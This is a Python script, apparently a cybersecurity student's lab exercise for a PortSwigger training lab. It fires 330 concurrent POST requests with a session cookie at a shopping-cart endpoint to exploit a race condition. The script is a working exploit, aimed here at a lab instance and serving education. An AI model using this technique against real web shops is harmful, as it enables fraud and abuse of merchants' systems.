#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Burp Suite Laboratory - Race Condition Attack Script

This script performs concurrent HTTP POST requests to exploit race condition
vulnerabilities in web applications. It's designed for educational purposes
as part of a Master's Degree in Cybersecurity laboratory exercise.

Author: Cybersecurity Student
Purpose: Educational - PortSwigger Web Security Academy Labs
Target: Race condition vulnerabilities in shopping cart functionality
"""

import asyncio
import aiohttp
import sys
import time
from typing import Dict, Any

# =============================================================================
# CONFIGURATION SECTION
# =============================================================================
# The following information must be updated according to the data captured
# from Burp Suite Repeater. Update these values before running the script:
#
# Required updates:
# - URL: Target endpoint
# - Host header in HEADERS
# - Origin header in HEADERS
# - Referer header in HEADERS
# - Session cookie in COOKIES
# - Request count 'n' in main() function
# =============================================================================

# Target configuration - UPDATE THESE VALUES
URL = 'https://0a820027030cd29f8705e3c600150019.web-security-academy.net/cart'

# HTTP Headers - UPDATE Host, Origin, and Referer to match your lab instance
HEADERS: Dict[str, str] = {
    'Host': '0a820027030cd29f8705e3c600150019.web-security-academy.net',
    'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:139.0) Gecko/20100101 Firefox/139.0',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
    'Accept-Language': 'en-US,en;q=0.5',
    'Accept-Encoding': 'gzip, deflate, br',
    'Content-Type': 'application/x-www-form-urlencoded',
    'Origin': 'https://0a820027030cd29f8705e3c600150019.web-security-academy.net',
    'Referer': 'https://0a820027030cd29f8705e3c600150019.web-security-academy.net/product?productId=1',
    'Upgrade-Insecure-Requests': '1',
    'Sec-Fetch-Dest': 'document',
    'Sec-Fetch-Mode': 'navigate',
    'Sec-Fetch-Site': 'same-origin',
    'Sec-Fetch-User': '?1',
    'Sec-Gpc': '1',
    'Priority': 'u=0, i',
    'Te': 'trailers',
}

# Session cookies - UPDATE with your session token from Burp Suite
COOKIES: Dict[str, str] = {'session': 're4BQfkvR9vFZIzemtceiZZrIQ0zeOc3'}

# POST data payload - Modify as needed for your specific lab
DATA: Dict[str, str] = {'productId': '1', 'redir': 'PRODUCT', 'quantity': '99'}


async def send_one(session: aiohttp.ClientSession, i: int) -> str:
    """
    Send a single HTTP POST request to the target URL.

    Args:
        session: aiohttp ClientSession instance
        i: Request index for logging purposes

    Returns:
        Response text content
    """
    try:
        async with session.post(URL, headers=HEADERS, cookies=COOKIES, data=DATA) as resp:
            status_indicator = "✓" if resp.status == 200 else "✗"
            print(f"[{i+1:03d}] {status_indicator} {resp.status}")
            return await resp.text()
    except asyncio.TimeoutError:
        print(f"[{i+1:03d}] ⏰ TIMEOUT")
        return ""
    except Exception as e:
        print(f"[{i+1:03d}] ❌ ERROR: {str(e)}")
        return ""


async def main():
    """
    Main execution function that orchestrates the race condition attack.

    This function creates multiple concurrent HTTP requests to exploit
    potential race conditions in the target web application.
    """
    # Configuration
    n = 330  # Number of concurrent requests - ADJUST AS NEEDED
    connection_limit = 50  # Maximum concurrent connections
    timeout = aiohttp.ClientTimeout(total=30)  # 30 second timeout

    print(f"🚀 Starting race condition attack...")
    print(f"📊 Target: {URL}")
    print(f"🔢 Requests: {n}")
    print(f"🔗 Connection limit: {connection_limit}")
    print(f"⏱️  Timeout: {timeout.total}s")
    print("-" * 50)

    start_time = time.time()

    # Create TCP connector with connection pooling
    conn = aiohttp.TCPConnector(limit=connection_limit)

    try:
        async with aiohttp.ClientSession(
            connector=conn,
            timeout=timeout
        ) as session:
            # Create and execute all tasks concurrently
            tasks = [send_one(session, i) for i in range(n)]
            await asyncio.gather(*tasks, return_exceptions=True)

    except KeyboardInterrupt:
        print("\n⚠️  Attack interrupted by user")
        sys.exit(1)
    except Exception as e:
        print(f"\n❌ Fatal error: {str(e)}")
        sys.exit(1)
    finally:
        end_time = time.time()
        duration = end_time - start_time
        print("-" * 50)
        print(f"✅ Attack completed in {duration:.2f} seconds")
        print(f"📈 Average: {n/duration:.2f} requests/second")


def validate_configuration() -> bool:
    """
    Validate that required configuration values have been updated.

    Returns:
        True if configuration appears valid, False otherwise
    """
    # Check if default values are still being used
    if '0a390020035ec1b5821438f800a10031' in URL:
        print("⚠️  WARNING: You're using the default lab URL.")
        print(
            "   Please update the URL, headers, and cookies for your specific lab instance.")
        return False

    if COOKIES.get('session') == '6RhAsnvNaKZ6UinARqIdbxeNxVCUMoOg':
        print("⚠️  WARNING: You're using the default session cookie.")
        print("   Please update the session cookie from your Burp Suite capture.")
        return False

    return True


if __name__ == '__main__':
    print("="*60)
    print("🎯 BURP SUITE LABORATORY - RACE CONDITION ATTACK")
    print("🎓 Master's Degree in Cybersecurity Exercise")
    print("📚 Educational Purpose Only")
    print("="*60)
    print()

    # Validate configuration before starting
    if not validate_configuration():
        print("\n❌ Configuration validation failed.")
        print("Please update the script configuration and try again.")
        sys.exit(1)

    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        print("\n👋 Goodbye!")
        sys.exit(0)
